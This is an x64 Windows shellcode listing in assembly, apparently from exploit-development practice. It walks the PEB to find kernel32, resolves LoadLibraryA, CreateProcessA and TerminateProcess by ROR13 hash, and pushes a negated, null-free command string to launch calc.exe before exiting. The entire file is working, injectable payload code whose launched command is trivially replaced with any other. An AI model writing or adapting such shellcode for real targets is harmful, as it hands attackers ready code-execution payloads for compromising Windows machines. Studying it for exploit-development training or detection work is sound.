start:
    mov rbp, rsp
    add rsp, 0xfffffffffffff9c0         ; Negated 0x640

resolve_kernel32:
    mov dl, 0x4b                        ; dl = 'K'
    mov rcx, 0xffffffffffffffa0
    neg rcx
    mov r8, gs:[rcx]                    ; R8 = address of PEB
    mov rdi, [r8 + 0x18]                ; RDI = address of _PEB_LDR_DATA
    mov rdi, [rdi + 0x30]               ; RDI = address of InInitializationOrderModuleList (first _LIST_ENTRY)

search:
    xor rcx, rcx
    mov rbx, [rdi + 0x10]               ; RBX = DllBase
    mov rsi, [rdi + 0x40]               ; RSI = address of UNICODE string BaseDllName.Buffer
    mov rdi, [rdi]                      ; RDI = address of the next _LIST_ENTRY
    cmp [rsi + 0x18], cx                ; Compare the 24-th UNICODE char with NULL
    jne search                          ; If length of BaseDllName is not 12 UNICODE chars, continue searching
    cmp [rsi], dl                       ; Compare the first UNICODE char with 'K'
    jne search                          ; If the first UNICODE char is not 'K', continue searching

find_function_jmp:
    jmp callback                        ; Jump to callback to make a negative (null byte free) call to get_find_function_addr

get_find_function_addr:                         
    pop rsi                             ; The address of find_function is popped in RSI
    mov [rbp + 0x8], rsi                ; The address of find_function is stored at (RBP + 8)
    jmp resolve_k32_sym_1               ; Dummy jump point to shorten distance, preventing NULL's

callback:
    call get_find_function_addr         ; When this call is done, the address of the 1st instruction find_function (add rsp, 8) is pushed to the stack
                                        ; This is the address of find_function, and it will be popped in ESI (see get_find_function_addr).
find_function:         
    add rsp, 8                          ; Add for some space

find_function_loop2:
    xor rax, rax
    xor rdi, rdi
    mov eax, [rbx + 0x3c]               ; EAX = offset to the PE Header of the module = e_lfanew
    mov rcx, 0xffffffffffffff78         ; Negated 0x88
    neg rcx
    add rcx, rbx
    add rcx, rax
    mov edi, [rcx]                      ; EDI = RVA of the Export Directory Table of the module (1st field: VirtualAddress)
    add rdi, rbx                        ; RDI = VMA of the Export Directory Table of the module
    mov ecx, [rdi + 24]                 ; ECX = NumberOfNames (field of the Export Directory Table of the module)
    mov eax, [rdi + 32]                 ; EAX = RVA of AddressOfNames (array of Name Addresses, field of the Export Directory Table)
    add rax, rbx                        ; EAX = VMA of AddressOfNames
    mov [rbp - 8], rax                  ; Save the VMA of AddressOfNames at (EBP - 8): this location is never touched for anything else

find_function_loop:
    dec ecx                             ; Initially, ECX = NumberOfNames: decrement to get the index of the last name
    mov rax, [rbp - 8]                  ; EAX = VMA of AddressOfNames
    mov esi, [rax + rcx * 4]            ; ESI = RVA of the current Symbol Name
    add rsi, rbx                        ; RSI = VMA of the current Symbol Name

compute_hash:
    xor rax, rax                        ; NULL EAX
    cdq                                 ; NULL EDX
    cld                                 ; Clear direction flag
    jmp compute_hash_repeat

resolve_k32_sym_1:
    ; Dummy jump point to shorten distance, preventing NULL's
    jmp resolve_k32_sym_2

compute_hash_repeat:
    lodsb                               ; Load the byte pointed by ESI into AL
    test al, al                         ; Test if the NULL terminator of the Symbol Name has been reached
    jz compute_hash_finished            ; Found the hash
    ror edx, 0xd                        ; Right-shift EDX of 13 bits
    add edx, eax                        ; EDX += current EAX value
    jnz compute_hash_repeat             ; If the NULL terminator has been reached (ZF = 1), proceed to hash comparison
                                        ; Else, perform the next iteration of the hash-computation algorithm
                                        ; At this point, EDX contains the computed hash of the current symbol

compute_hash_finished:

find_function_compare:                
    cmp edx, [rsp]                      ; Compare the computed hash with the hash of the wanted symbol
    jnz find_function_loop              ; If ZF = 0, the hash is different: proceed with the next name from AddressOfNames
                                        ; If ZF = 1, the hash is equal: symbol found: continue hereby                                            
    mov edx, [rdi + 0x24]               ; EDX = RVA of the AddressOfNameOrdinals array
    add rdx, rbx                        ; RDX = VMA of the AddressOfNameOrdinals array
    mov cx, [rdx + 2 * rcx]             ; CX = Symbol's Ordinal (lower 16 bits of ECX)
    mov edx, [rdi + 0x1c]               ; EDX = RVA of the AddressOfFunctions array
    add rdx, rbx                        ; RDX = VMA of the AddressOfFunctions array
    mov eax, [rdx + 4 * rcx]            ; EAX = AddressOfFunctions[ordinal] = RVA of the wanted symbol
    add rax, rbx                        ; EAX = VMA of the wanted symbol
    mov [rsp+0x10], rax                 ; Copy resolved function to stack

find_function_finish:                   ; When we get here, all wanted symbols have been resolved: their VMAs are on the stack
    sub rsp, 0x8                        ; Point RSP to the Return Address of find_function
    ret                                 ; Return

resolve_k32_sym_2:
    mov rax, 0xffffffff13F1B172         ; Negated hash of LoadLibraryA
    neg rax
    push rax
    call [rbp + 0x8]                    ; Call find function
    mov [rbp+0x10], rax                 ; Store LoadLibraryA
    mov rax, 0xffffffffE94C018E         ; Negated hash of CreateProcessA
    neg rax
    push rax
    call [rbp+0x8]                      ; Call find function
    mov [rbp+0x18], rax                 ; Store CreateProcessA  
    mov rax, 0xffffffff874A467D         ; Negated hash of TerminateProcess
    neg rax
    push rax
    call [rbp+0x8]                      ; Call find function
    mov [rbp+0x20], rax                 ; Store TerminateProcess     

create_cmd_string:
    xor rax, rax
    neg rax
    push rax                            ; Null terminator + padding
    mov eax, 0x9a879ad2                 ; '.exe'
    neg eax
    push rax                            ; '.exe'
    mov rax, 0x9c939e9ca3cdcc93         ; 'm32\\calc'
    neg rax
    push rax                            ; 'm32\\calc'
    mov rax, 0x9a8b8c868ca38c89         ; 'ws\\syste'
    neg rax
    push rax                            ; 'ws\\syste'
    mov rax, 0x909b919688a3c59d         ; 'c:\\windo'
    neg rax
    push rax                            ; 'c:\\windo' 
    lea rax, [rsp]
    mov [rbp+0x28], rax                 ; ptr lpCommandLine (c:\\windows\\system32\\calc.exe)   

;typedef struct _STARTUPINFOA {
;  DWORD  cb;                       // 0x68     // 0x0
;  LPSTR  lpReserved;               // NULL     // 0x8
;  LPSTR  lpDesktop;                // NULL     // 0x10
;  LPSTR  lpTitle;                  // NULL     // 0x18
;  DWORD  dwX;                      // NULL     // 0x20
;  DWORD  dwY;                      // NULL     // 0x24
;  DWORD  dwXSize;                  // NULL     // 0x28
;  DWORD  dwYSize;                  // NULL     // 0x2c
;  DWORD  dwXCountChars;            // NULL     // 0x30
;  DWORD  dwYCountChars;            // NULL     // 0x34
;  DWORD  dwFillAttribute;          // NULL     // 0x38
;  DWORD  dwFlags;                  // NULL     // 0x3c
;  WORD   wShowWindow;              // NULL     // 0x40
;  WORD   cbReserved2;              // NULL     // 0x42
;  LPBYTE lpReserved2;              // NULL     // 0x48
;  HANDLE hStdInput;                // NULL     // 0x50
;  HANDLE hStdOutput;               // NULL     // 0x58
;  HANDLE hStdError;                // NULL     // 0x60
;} STARTUPINFOA, *LPSTARTUPINFOA;
create_startupinfoa:
    sub rsp, 0x68                       ; Size of structure StartupInfoA
    xor rax, rax
    lea rdi, [rsp]
    sub rdi, 0xfffffffffffffd01         ; Negated 0x300 for space on stack
    inc rdi
    mov rbx, rdi
    xor ecx, ecx
    add cl, 0x20
    rep stosd                           ; Zero-out 0x80 bytes in a loop
    mov al, 0x68                        ; EAX = sizeof(_STARTUPINFO) = 0x68
    mov [rbx], eax                      ; Field lpStartInfo.cb = sizeof(_STARTUPINFO) 
    xor eax, eax
    add al, 0xff
    inc eax                             ; EAX = STARTF_USESTDHANDLES
    mov [rbx + 0x3c], eax               ; Field lpStartupInfo.dwFlags = STARTF_USESTDHANDLES
    mov [rbx + 0x50], rax               ; Field lpStartupInfo.hStdInput
    mov [rbx + 0x58], rax               ; Field lpStartupInfo.hStdOutput
    mov [rbx + 0x60], rax               ; Field lpStartupInfo.hStdError 

; typedef struct _PROCESS_INFORMATION {
;   HANDLE hProcess;
;   HANDLE hThread;
;   DWORD  dwProcessId;
;   DWORD  dwThreadId;
; } PROCESS_INFORMATION, *PPROCESS_INFORMATION, *LPPROCESS_INFORMATION;

;BOOL CreateProcessA(
;  [in, optional]      LPCSTR                lpApplicationName,     // rcx
;  [in, out, optional] LPSTR                 lpCommandLine,         // rdx
;  [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,   // r8
;  [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,    // r9
;  [in]                BOOL                  bInheritHandles,       // [rsp+0x20]
;  [in]                DWORD                 dwCreationFlags,       // [rsp+0x28]
;  [in, optional]      LPVOID                lpEnvironment,         // [rsp+0x30]
;  [in, optional]      LPCSTR                lpCurrentDirectory,    // [rsp+0x38]
;  [in]                LPSTARTUPINFOA        lpStartupInfo,         // [rsp+0x40]
;  [out]               LPPROCESS_INFORMATION lpProcessInformation   // [rsp+0x48]
;);
call_createproccessa:
    xor rcx, rcx                        ; Parameter lpApplicationName = 0 
    mov rdx, [rbp+0x28]                 ; lpCommandLine from previous block
    xor r8, r8                          ; Parameter lpProcessAttributes = 0
    xor r9, r9                          ; Parameter lpThreadAttributes = 0
    xor rax, rax
    inc eax
    mov [rsp + 0x20], rax               ; Parameter bInheritHandles = 1
    dec eax
    mov [rsp + 0x28], rax               ; Parameter dwCreationFlags = 0
    mov [rsp + 0x30], rax               ; Parameter lpEnvironment = 0
    mov [rsp + 0x38], rax               ; Parameter lpCurrentDirectory = 0
    mov [rsp + 0x40], rbx               ; Parameter lpStartupInfo = address of _STARTUPINFO
    add rbx, 0x68
    mov [rsp + 0x48], rbx               ; Parameter lpProcessInformation = output address, right after _STARTUPINFO
    call [rbp+0x18]                     ; Call CreateProcessA  

call_TerminateProcess:
    xor rcx, rcx
    dec rcx                             ; Parameter hProcess = -1 = this process
    xor rdx, rdx                        ; Parameter uExitCode = 0 (graceful termination)
    call [rbp+0x20]                     ; Call TerminateProcess

